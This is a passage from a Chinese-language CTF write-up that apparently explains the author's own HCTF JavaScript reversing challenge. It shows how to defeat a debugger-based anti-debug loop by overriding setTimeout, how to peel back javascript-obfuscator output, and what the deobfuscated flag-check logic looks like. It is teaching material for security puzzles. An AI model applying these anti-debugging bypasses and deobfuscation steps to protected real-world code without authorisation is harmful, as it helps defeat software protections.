<p>2&#x3001;&#x9759;&#x6001;&#x5206;&#x6790;<br>&#x56E0;&#x4E3A;&#x9898;&#x76EE;&#x4E2D;&#x4EE3;&#x7801;&#x8F83;&#x5C11;&#xFF0C;&#x6211;&#x6CA1;&#x529E;&#x6CD5;&#x628A;&#x4EE3;&#x7801;&#x6DF7;&#x5165;&#x6DF1;&#x5C42;&#x903B;&#x8F91;&#xFF0C;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x7EAF;&#x9759;&#x6001;&#x5206;&#x6790;&#x3002;</p>
<p>3&#x3001;patch debugger&#x51FD;&#x6570;<br>&#x7531;&#x4E8E;debugger&#x672C;&#x8EAB;&#x667A;&#x6167;&#x89E6;&#x53D1;&#x4E00;&#x6B21;&#xFF0C;&#x4E0D;&#x4F1A;&#x65E0;&#x9650;&#x5236;&#x7684;&#x5361;&#x6B7B;&#x8C03;&#x8BD5;&#x5668;&#xFF0C;&#x8FD9;&#x91CC;&#x4F1A;&#x51FA;&#x73B0;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x6BCF;5s&#x8F6E;&#x8BE2;&#x68C0;&#x67E5;&#x4E00;&#x6B21;&#x3002;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;patch settimeout&#x51FD;&#x6570;&#x6765;&#x7ED5;&#x8FC7;&#x3002;</p>
<pre><code>window._setTimeout = window.setTimeout;
window.setTimeout = function () {};
</code></pre><p>&#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x63D2;&#x4EF6;TamperMonkey&#x89E3;&#x51B3;&#x95EE;&#x9898;&#x3002;</p>
<p>&#x9664;&#x4E86;&#x5361;&#x6B7B;debug&#x4EE5;&#x5916;&#xFF0C;&#x6211;&#x8FD8;&#x52A0;&#x5165;&#x4E86;&#x8F6E;&#x8BE2;&#x5237;&#x65B0;console&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
<pre><code>setInterval(&quot;window.console.log(&apos;Welcome to HCTF :&gt;&apos;)&quot;, 50);
</code></pre><p>&#x540C;&#x6837;&#x7684;&#x529E;&#x6CD5;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#xFF0C;&#x5C31;&#x4E0D;&#x591A;&#x8BF4;&#x4E86;&#x3002;</p>
<h4 id="&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;"><a name="&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;" class="anchor-navigation-ex-anchor" href="#&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;" class="plugin-anchor" href="#&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;</h4>
<p>&#x5728;&#x53BB;&#x9664;&#x6389;&#x8FD9;&#x90E8;&#x5206;&#x65E0;&#x7528;&#x4EE3;&#x7801;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x63A5;&#x7740;&#x60F3;&#x529E;&#x6CD5;&#x53BB;&#x9664;&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;&#x3002;</p>
<p>&#x8FD9;&#x91CC;&#x6700;&#x5916;&#x5C42;&#x7684;&#x4EE3;&#x7801;&#x6DF7;&#x6DC6;&#xFF0C;&#x6211;&#x662F;&#x901A;&#x8FC7;<a href="https://github.com/javascript-obfuscator/javascript-obfuscator" target="_blank">https://github.com/javascript-obfuscator/javascript-obfuscator</a>&#x505A;&#x4E86;&#x6DF7;&#x6DC6;&#x3002;</p>
<p>ps:&#x56E0;&#x4E3A;&#x6211;&#x5728;&#x4EE3;&#x7801;&#x91CC;&#x52A0;&#x5165;&#x4E86;es6&#x8BED;&#x6CD5;&#xFF0C;&#x5E02;&#x9762;&#x4E0A;&#x7684;&#x5F88;&#x591A;&#x5DE5;&#x5177;&#x90FD;&#x4E0D;&#x652F;&#x6301;es6&#x8BED;&#x6CD5;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x53BB;&#x6DF7;&#x6DC6;&#x7684;&#x4EE3;&#x7801;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#xFF01;</p>
<p>&#x66F4;&#x6709;&#x8DA3;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x79CD;&#x6DF7;&#x6DC6;&#x662F;&#x4E0D;&#x53EF;&#x9006;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x9010;&#x6E10;&#x53BB;&#x6DF7;&#x6DC6;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x7F8E;&#x5316;&#x4EE3;&#x7801;&#x3002;</p>
<p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x7B80;&#x5355;&#x7F8E;&#x5316;&#x4E00;&#x4E0B;&#x4EE3;&#x7801;&#x683C;&#x5F0F;</p>
<pre><code>(function (_0xd4b7d6, _0xad25ab) {
    var _0x5e3956 = function (_0x1661d3) {
        while (--_0x1661d3) {
            _0xd4b7d6[&apos;push&apos;](_0xd4b7d6[&apos;shift&apos;]());
        }
    };
    _0x5e3956(++_0xad25ab);
}(_0x180a, 0x1a2));
var _0xa180 = function (_0x5c351c, _0x2046d8) {
    _0x5c351c = _0x5c351c - 0x0;
    var _0x26f3b3 = _0x180a[_0x5c351c];
    return _0x26f3b3;
};

function check(_0x5b7c0c) {
    try {
        var _0x2e2f8d = [&apos;code&apos;, _0xa180(&apos;0x0&apos;), _0xa180(&apos;0x1&apos;), _0xa180(&apos;0x2&apos;), &apos;invalidMonetizationCode&apos;, _0xa180(&apos;0x3&apos;), _0xa180(&apos;0x4&apos;), _0xa180(&apos;0x5&apos;), _0xa180(&apos;0x6&apos;), _0xa180(&apos;0x7&apos;), _0xa180(&apos;0x8&apos;), _0xa180(&apos;0x9&apos;), _0xa180(&apos;0xa&apos;), _0xa180(&apos;0xb&apos;), _0xa180(&apos;0xc&apos;), _0xa180(&apos;0xd&apos;), _0xa180(&apos;0xe&apos;), _0xa180(&apos;0xf&apos;), _0xa180(&apos;0x10&apos;), _0xa180(&apos;0x11&apos;), &apos;url&apos;, _0xa180(&apos;0x12&apos;), _0xa180(&apos;0x13&apos;), _0xa180(&apos;0x14&apos;), _0xa180(&apos;0x15&apos;), _0xa180(&apos;0x16&apos;), _0xa180(&apos;0x17&apos;), _0xa180(&apos;0x18&apos;), &apos;tabs&apos;, _0xa180(&apos;0x19&apos;), _0xa180(&apos;0x1a&apos;), _0xa180(&apos;0x1b&apos;), _0xa180(&apos;0x1c&apos;), _0xa180(&apos;0x1d&apos;), &apos;replace&apos;, _0xa180(&apos;0x1e&apos;), _0xa180(&apos;0x1f&apos;), &apos;includes&apos;, _0xa180(&apos;0x20&apos;), &apos;length&apos;, _0xa180(&apos;0x21&apos;), _0xa180(&apos;0x22&apos;), _0xa180(&apos;0x23&apos;), _0xa180(&apos;0x24&apos;), _0xa180(&apos;0x25&apos;), _0xa180(&apos;0x26&apos;), _0xa180(&apos;0x27&apos;), _0xa180(&apos;0x28&apos;), _0xa180(&apos;0x29&apos;), &apos;toString&apos;, _0xa180(&apos;0x2a&apos;), &apos;split&apos;];
        var _0x50559f = _0x5b7c0c[_0x2e2f8d[0x5]](0x0, 0x4);
        var _0x5cea12 = parseInt(btoa(_0x50559f), 0x20);
        eval(function (_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2) {
            _0x2d59cf = function (_0x4be75f) {
                return _0x4be75f[&apos;toString&apos;](_0x177f13);
            };
            if (!&apos;&apos; [&apos;replace&apos;](/^/, String)) {
                while (_0x46da6f--) _0x2829f2[_0x2d59cf(_0x46da6f)] = _0x802d91[_0x46da6f] || _0x2d59cf(_0x46da6f);
                _0x802d91 = [function (_0x5e8f1a) {
                    return _0x2829f2[_0x5e8f1a];
                }];
                _0x2d59cf = function () {
                    return _0xa180(&apos;0x2b&apos;);
                };
                _0x46da6f = 0x1;
            };
            while (_0x46da6f--)
                if (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[_0xa180(&apos;0x2c&apos;)](new RegExp(&apos;\x5cb&apos; + _0x2d59cf(_0x46da6f) + &apos;\x5cb&apos;, &apos;g&apos;), _0x802d91[_0x46da6f]);
            return _0x200db2;
        }(_0xa180(&apos;0x2d&apos;), 0x11, 0x11, _0xa180(&apos;0x2e&apos;)[&apos;split&apos;](&apos;|&apos;), 0x0, {}));
        (function (_0x3291b7, _0xced890) {
            var _0xaed809 = function (_0x3aba26) {
                while (--_0x3aba26) {
                    _0x3291b7[_0xa180(&apos;0x4&apos;)](_0x3291b7[&apos;shift&apos;]());
                }
            };
            _0xaed809(++_0xced890);
        }(_0x2e2f8d, _0x5cea12 % 0x7b));
        var _0x43c8d1 = function (_0x3120e0) {
            var _0x3120e0 = parseInt(_0x3120e0, 0x10);
            var _0x3a882f = _0x2e2f8d[_0x3120e0];
            return _0x3a882f;
        };
        var _0x1c3854 = function (_0x52ba71) {
            var _0x52b956 = &apos;0x&apos;;
            for (var _0x59c050 = 0x0; _0x59c050 &lt; _0x52ba71[_0x43c8d1(0x8)]; _0x59c050++) {
                _0x52b956 += _0x52ba71[_0x43c8d1(&apos;f&apos;)](_0x59c050)[_0x43c8d1(0xc)](0x10);
            }
            return _0x52b956;
        };
        var _0x76e1e8 = _0x5b7c0c[_0x43c8d1(0xe)](&apos;_&apos;);
        var _0x34f55b = (_0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](-0x2, 0x2)) ^ _0x1c3854(_0x76e1e8[0x0][_0x43c8d1(0xd)](0x4, 0x1))) % _0x76e1e8[0x0][_0x43c8d1(0x8)] == 0x5;
        if (!_0x34f55b) {
            return ![];
        }
        b2c = function (_0x3f9bc5) {
            var _0x3c3bd8 = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&apos;;
            var _0x4dc510 = [];
            var _0x4a199f = Math[_0xa180(&apos;0x25&apos;)](_0x3f9bc5[_0x43c8d1(0x8)] / 0x5);
            var _0x4ee491 = _0x3f9bc5[_0x43c8d1(0x8)] % 0x5;
            if (_0x4ee491 != 0x0) {
                for (var _0x1e1753 = 0x0; _0x1e1753 &lt; 0x5 - _0x4ee491; _0x1e1753++) {
                    _0x3f9bc5 += &apos;&apos;;
                }
                _0x4a199f += 0x1;
            }
            for (_0x1e1753 = 0x0; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) {
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)](_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5) &gt;&gt; 0x3));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5) &amp; 0x7) &lt;&lt; 0x2 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x1) &gt;&gt; 0x6));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x1) &amp; 0x3f) &gt;&gt; 0x1));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x1) &amp; 0x1) &lt;&lt; 0x4 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x2) &gt;&gt; 0x4));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x2) &amp; 0xf) &lt;&lt; 0x1 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x3) &gt;&gt; 0x7));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x3) &amp; 0x7f) &gt;&gt; 0x2));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)]((_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x3) &amp; 0x3) &lt;&lt; 0x3 | _0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x4) &gt;&gt; 0x5));
                _0x4dc510[_0x43c8d1(&apos;1b&apos;)](_0x3c3bd8[_0x43c8d1(&apos;1d&apos;)](_0x3f9bc5[_0x43c8d1(&apos;f&apos;)](_0x1e1753 * 0x5 + 0x4) &amp; 0x1f));
            }
            var _0x545c12 = 0x0;
            if (_0x4ee491 == 0x1) _0x545c12 = 0x6;
            else if (_0x4ee491 == 0x2) _0x545c12 = 0x4;
            else if (_0x4ee491 == 0x3) _0x545c12 = 0x3;
            else if (_0x4ee491 == 0x4) _0x545c12 = 0x1;
            for (_0x1e1753 = 0x0; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0xa180(&apos;0x2f&apos;)]();
            for (_0x1e1753 = 0x0; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[_0x43c8d1(&apos;1b&apos;)](&apos;=&apos;);
            (function () {
                (function _0x3c3bd8() {
                    try {
                        (function _0x4dc510(_0x460a91) {
                            if ((&apos;&apos; + _0x460a91 / _0x460a91)[_0xa180(&apos;0x30&apos;)] !== 0x1 || _0x460a91 % 0x14 === 0x0) {
                                (function () {}[&apos;constructor&apos;](&apos;debugger&apos;)());
                            } else {
                                debugger;
                            }
                            _0x4dc510(++_0x460a91);
                        }(0x0));
                    } catch (_0x30f185) {
                        setTimeout(_0x3c3bd8, 0x1388);
                    }
                }());
            }());
            return _0x4dc510[_0xa180(&apos;0x31&apos;)](&apos;&apos;);
        };
        e = _0x1c3854(b2c(_0x76e1e8[0x2])[_0x43c8d1(0xe)](&apos;=&apos;)[0x0]) ^ 0x53a3f32;
        if (e != 0x4b7c0a73) {
            return ![];
        }
        f = _0x1c3854(b2c(_0x76e1e8[0x3])[_0x43c8d1(0xe)](&apos;=&apos;)[0x0]) ^ e;
        if (f != 0x4315332) {
            return ![];
        }
        n = f * e * _0x76e1e8[0x0][_0x43c8d1(0x8)];
        h = function (_0x4c466e, _0x28871) {
            var _0x3ea581 = &apos;&apos;;
            for (var _0x2fbf7a = 0x0; _0x2fbf7a &lt; _0x4c466e[_0x43c8d1(0x8)]; _0x2fbf7a++) {
                _0x3ea581 += _0x28871(_0x4c466e[_0x2fbf7a]);
            }
            return _0x3ea581;
        };
        j = _0x76e1e8[0x1][_0x43c8d1(0xe)](&apos;3&apos;);
        if (j[0x0][_0x43c8d1(0x8)] != j[0x1][_0x43c8d1(0x8)] || (_0x1c3854(j[0x0]) ^ _0x1c3854(j[0x1])) != 0x1613) {
            return ![];
        }
        k = _0xffcc52 =&gt; _0xffcc52[_0x43c8d1(&apos;f&apos;)]() * _0x76e1e8[0x1][_0x43c8d1(0x8)];
        l = h(j[0x0], k);
        if (l != 0x2f9b5072) {
            return ![];
        }
        m = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x0, 0x4)) - 0x48a05362 == n % l;

        function _0x5a6d56(_0x5a25ab, _0x4a4483) {
            var _0x55b09f = &apos;&apos;;
            for (var _0x508ace = 0x0; _0x508ace &lt; _0x4a4483; _0x508ace++) {
                _0x55b09f += _0x5a25ab;
            }
            return _0x55b09f;
        }
        if (!m || _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x5, 0x1), 0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x5, 0x4) || _0x76e1e8[0x4][_0x43c8d1(0xd)](-0x2, 0x1) - _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) != 0x1) {
            return ![];
        }
        o = _0x1c3854(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2))[_0x43c8d1(0xd)](0x2) == _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x1)[_0x43c8d1(&apos;f&apos;)]() * _0x76e1e8[0x4][_0x43c8d1(0x8)] * 0x5;
        return o &amp;&amp; _0x76e1e8[0x4][_0x43c8d1(0xd)](0x4, 0x1) == 0x2 &amp;&amp; _0x76e1e8[0x4][_0x43c8d1(0xd)](0x6, 0x2) == _0x5a6d56(_0x76e1e8[0x4][_0x43c8d1(0xd)](0x7, 0x1), 0x2);
    } catch (_0x4cbb89) {
        console[&apos;log&apos;](&apos;gg&apos;);
        return ![];
    }
}
</code></pre><p>&#x4EE3;&#x7801;&#x91CC;&#x4E3B;&#x8981;&#x6709;&#x51E0;&#x70B9;&#x6DF7;&#x6DC6;&#xFF1A;  </p>
<ul>
<li>1&#x3001;&#x53D8;&#x91CF;&#x540D;&#x66FF;&#x6362;&#xFF0C;a --&gt; _0xd4b7d6&#xFF0C;&#x8FD9;&#x79CD;&#x4E1C;&#x897F;&#x6700;&#x70E6;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x6700;&#x7B80;&#x5355;&#xFF0C;&#x6279;&#x91CF;&#x66FF;&#x6362;&#xFF0C;&#x5728;&#x6211;&#x770B;&#x6765;&#x5373;&#x4F7F;abcd&#x8FD9;&#x79CD;&#x53D8;&#x91CF;&#x4E5F;&#x6BD4;&#x8FD9;&#x4E2A;&#x5BB9;&#x6613;&#x8BFB;</li>
<li>2&#x3001;&#x63D0;&#x53D6;&#x4E86;&#x6240;&#x6709;&#x7684;&#x65B9;&#x6CD5;&#x5230;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x8FD9;&#x79CD;&#x4E5F;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x8981;&#x5728;chrome&#x4E2D;&#x9010;&#x6B65;&#x8C03;&#x8BD5;&#x66FF;&#x6362;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</li>
</ul>
<p>     <a href="http://static.zybuluo.com/LoRexxar/jk8uuvv53ypu2p2hrywrh4lj/image.png" rel="grouped" title="" target="_blank" class="fancybox">
       <img src="http://static.zybuluo.com/LoRexxar/jk8uuvv53ypu2p2hrywrh4lj/image.png" alt="">
     </a></p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5C0F;&#x7684;&#x7EC6;&#x8282;&#xFF0C;&#x5F88;&#x5E38;&#x89C1;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x53EF;&#x8BF4;&#x7684;</p>
<p><code>&quot;s&quot;.length()  --&gt; &quot;s&quot;[&apos;length&apos;]()</code></p>
<p>&#x6700;&#x7EC8;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x4F18;&#x5316;&#x5230;&#x8FD9;&#x4E2A;&#x5730;&#x6B65;&#xFF0C;&#x57FA;&#x672C;&#x5DF2;&#x7ECF;&#x53EF;&#x8BFB;&#x4E86;&#xFF0C;&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x662F;&#x5206;&#x6790;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p>
<pre><code>    function check(flag){
        var _ = [&apos;\x63\x6f\x64\x65&apos;, &apos;\x76\x65\x72\x73\x69\x6f\x6e&apos;, &apos;\x65\x72\x72\x6f\x72&apos;, &apos;\x64\x6f\x77\x6e\x6c\x6f\x61\x64&apos;, &apos;\x69\x6e\x76\x61\x6c\x69\x64\x4d\x6f\x6e\x65\x74\x69\x7a\x61\x74\x69\x6f\x6e\x43\x6f\x64\x65&apos;, &apos;\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31&apos;, &apos;\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37&apos;, &apos;\x46\x75\x6e\x63\x74\x69\x6f\x6e&apos;, &apos;\x72\x75\x6e&apos;, &apos;\x69\x64\x6c\x65&apos;, &apos;\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49&apos;, &apos;\x69\x6e\x69\x74&apos;, &apos;\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x65\x2d\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e\x2e\x63\x6f\x6d&apos;, &apos;\x6c\x6f\x63\x61\x6c&apos;, &apos;\x73\x74\x6f\x72\x61\x67\x65&apos;, &apos;\x65\x76\x61\x6c&apos;, &apos;\x74\x68\x65\x6e&apos;, &apos;\x67\x65\x74&apos;, &apos;\x67\x65\x74\x54\x69\x6d\x65&apos;, &apos;\x73\x65\x74\x55\x54\x43\x48\x6f\x75\x72\x73&apos;, &apos;\x75\x72\x6c&apos;, &apos;\x6f\x72\x69\x67\x69\x6e&apos;, &apos;\x73\x65\x74&apos;, &apos;\x47\x45\x54&apos;, &apos;\x6c\x6f\x61\x64\x69\x6e\x67&apos;, &apos;\x73\x74\x61\x74\x75\x73&apos;, &apos;\x72\x65\x6d\x6f\x76\x65\x4c\x69\x73\x74\x65\x6e\x65\x72&apos;, &apos;\x6f\x6e\x55\x70\x64\x61\x74\x65\x64&apos;, &apos;\x74\x61\x62\x73&apos;, &apos;\x63\x61\x6c\x6c\x65\x65&apos;, &apos;\x61\x64\x64\x4c\x69\x73\x74\x65\x6e\x65\x72&apos;, &apos;\x6f\x6e\x4d\x65\x73\x73\x61\x67\x65&apos;, &apos;\x72\x75\x6e\x74\x69\x6d\x65&apos;, &apos;\x65\x78\x65\x63\x75\x74\x65\x53\x63\x72\x69\x70\x74&apos;, &apos;\x72\x65\x70\x6c\x61\x63\x65&apos;, &apos;\x64\x61\x74\x61&apos;, &apos;\x74\x65\x73\x74&apos;, &apos;\x69\x6e\x63\x6c\x75\x64\x65\x73&apos;, &apos;\x68\x74\x74\x70\x3a\x2f\x2f&apos;, &apos;\x6c\x65\x6e\x67\x74\x68&apos;, &apos;\x55\x72\x6c\x20\x65\x72\x72\x6f\x72&apos;, &apos;\x71\x75\x65\x72\x79&apos;, &apos;\x66\x69\x6c\x74\x65\x72&apos;, &apos;\x61\x63\x74\x69\x76\x65&apos;, &apos;\x66\x6c\x6f\x6f\x72&apos;, &apos;\x72\x61\x6e\x64\x6f\x6d&apos;, &apos;\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74&apos;, &apos;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&apos;, &apos;\x70\x61\x72\x73\x65&apos;];

        var head = flag[&apos;substring&apos;](0, 4);
        var base = parseInt(btoa(head), 0x20); //344800


        (function (b, c) {
            var d = function (a) {
                    while (--a) {
                        b[&apos;push&apos;](b[&apos;shift&apos;]())
                    }
                };
            d(++c);
        }(_, base%123));

        var g = function (a) {
                var a = parseInt(a, 0x10);
                var c = _[a];
                return c;
            };

        var s2h = function(str){
            var result = &quot;0x&quot;;
            for(var i=0;i&lt;str[&apos;length&apos;];i++){
                result += str[&apos;charCodeAt&apos;](i)[&apos;toString&apos;](16)
            }
            return result;
        }

        var b = flag[&apos;split&apos;](&quot;_&quot;);
        var c = (s2h(b[0][&apos;substr&apos;](-2,2)) ^ s2h(b[0][&apos;substr&apos;](4,1))) % b[0][&apos;length&apos;] == 5;
        if(!c){
            return false;
        }

        b2c = function(s) {
        var alphabet = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;;

        var parts = [];
        var quanta = Math.floor((s[&apos;length&apos;] / 5));
        var leftover = s[&apos;length&apos;] % 5;

        if (leftover != 0) {
            for (var i = 0; i &lt; (5 - leftover); i++) {
                s += &apos;\x00&apos;;
            }
            quanta += 1;
        }

        for (i = 0; i &lt; quanta; i++) {
            parts.push(alphabet.charAt(s[&apos;charCodeAt&apos;](i * 5) &gt;&gt; 3));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5) &amp; 0x07) &lt;&lt; 2) | (s[&apos;charCodeAt&apos;](i * 5 + 1) &gt;&gt; 6)));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5 + 1) &amp; 0x3F) &gt;&gt; 1)));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5 + 1) &amp; 0x01) &lt;&lt; 4) | (s[&apos;charCodeAt&apos;](i * 5 + 2) &gt;&gt; 4)));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5 + 2) &amp; 0x0F) &lt;&lt; 1) | (s[&apos;charCodeAt&apos;](i * 5 + 3) &gt;&gt; 7)));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5 + 3) &amp; 0x7F) &gt;&gt; 2)));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5 + 3) &amp; 0x03) &lt;&lt; 3) | (s[&apos;charCodeAt&apos;](i * 5 + 4) &gt;&gt; 5)));
            parts.push(alphabet.charAt(((s[&apos;charCodeAt&apos;](i * 5 + 4) &amp; 0x1F))));
        }

        var replace = 0;
        if (leftover == 1)
            replace = 6;
        else if (leftover == 2)
            replace = 4;
        else if (leftover == 3)
            replace = 3;
        else if (leftover == 4)
            replace = 1;

        for (i = 0; i &lt; replace; i++)
            parts.pop();
        for (i = 0; i &lt; replace; i++)
            parts.push(&quot;=&quot;);

        return parts.join(&quot;&quot;);
        }

        e = s2h(b2c(b[2])[&apos;split&apos;](&quot;=&quot;)[0])^0x53a3f32
        if(e != 0x4b7c0a73){
            return false;
        }

        f = s2h(b2c(b[3])[&apos;split&apos;](&quot;=&quot;)[0]) ^ e;
        if(f != 0x4315332){
            return false;
        }

        n = f*e*b[0][&apos;length&apos;];

        h = function(str, func){
            var result = &quot;&quot;;
            for(var i=0;i&lt;str[&apos;length&apos;];i++){
                result += func(str[i])
            }
            return result;
        }

        j = b[1][&apos;split&apos;](&quot;3&quot;);
        if(j[0][&apos;length&apos;] != j[1][&apos;length&apos;] || (s2h(j[0])^s2h(j[1])) != 0x1613){
            return false;
        }

        k = str =&gt; str[&apos;charCodeAt&apos;]()*b[1][&apos;length&apos;];

        l = h(j[0],k);
        if(l!=0x2f9b5072){
            return false;
        }

        m = s2h(b[4][&apos;substr&apos;](0,4))-0x48a05362 == n%l;

        function u(str, j){
            var result = &quot;&quot;;
            for(var i=0;i&lt;j;i++){
                result += str;
            }
            return result;
        }

        if(!m || u(b[4][&apos;substr&apos;](5,1),2) == b[4][&apos;substr&apos;](-5,4) || (b[4][&apos;substr&apos;](-2,1) - b[4][&apos;substr&apos;](4,1)) != 1){
            return false
        }

        o = s2h(b[4][&apos;substr&apos;](6,2))[&apos;substr&apos;](2) == b[4][&apos;substr&apos;](6,1)[&apos;charCodeAt&apos;]()*b[4][&apos;length&apos;]*5;

        return o &amp;&amp; b[4][&apos;substr&apos;](4,1) == 2 &amp;&amp; b[4][&apos;substr&apos;](6,2) == u(b[4][&apos;substr&apos;](7,1),2);
    }
</code></pre><p>&#x5269;&#x4E0B;&#x7684;&#x4EE3;&#x7801;&#x5DF2;&#x7ECF;&#x6CA1;&#x4EC0;&#x4E48;&#x53EF;&#x8BF4;&#x7684;&#x4E86;&#x3002;</p>
<ul>
<li>1&#x3001;&#x9996;&#x5148;&#x662F;&#x786E;&#x8BA4;flag&#x524D;&#x7F00;&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167;<code>_</code>&#x5206;&#x5272;&#x4E3A;5&#x90E8;&#x5206;&#x3002;  </li>
<li>2&#x3001;g&#x51FD;&#x6570;&#x5BF9;&#x57FA;&#x7840;&#x6570;&#x7EC4;&#x505A;&#x4E86;&#x4E00;&#x4E9B;&#x5904;&#x7406;&#xFF0C;&#x5DF2;&#x7ECF;&#x6CA1;&#x4EC0;&#x4E48;&#x61C2;&#x4E86;&#x3002;  </li>
<li>3&#x3001;s2h&#x662F;&#x5B57;&#x7B26;&#x4E32;&#x5230;hex&#x7684;&#x8F6C;&#x5316;&#x51FD;&#x6570;  </li>
<li>4&#x3001;&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#x7684;&#x9A8C;&#x8BC1;&#x4E0D;&#x5B8C;&#x6574;&#xFF0C;&#x5BFC;&#x81F4;&#x4E25;&#x91CD;&#x7684;&#x591A;&#x89E3;&#xFF0C;&#x53EA;&#x80FD;&#x901A;&#x8FC7;&#x7206;&#x7834;&#x662F;&#x5426;&#x7B26;&#x5408;sha256&#x6765;&#x89E3;&#x51B3;&#x3002;  </li>
<li>5&#x3001;&#x540E;&#x9762;&#x5F15;&#x5165;&#x7684;b2c&#x51FD;&#x6570;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x6D4B;&#x8BD5;&#x5C31;&#x80FD;&#x53D1;&#x73B0;&#x662F;&#x4E00;&#x4E2A;base32&#x51FD;&#x6570;&#x3002;  </li>
<li>6&#x3001;&#x7B2C;&#x4E09;&#x90E8;&#x5206;&#x548C;&#x7B2C;&#x56DB;&#x90E8;&#x5206;&#x6700;&#x7B80;&#x5355;&#xFF0C;&#x5F02;&#x6216;&#x53EF;&#x5F97;  </li>
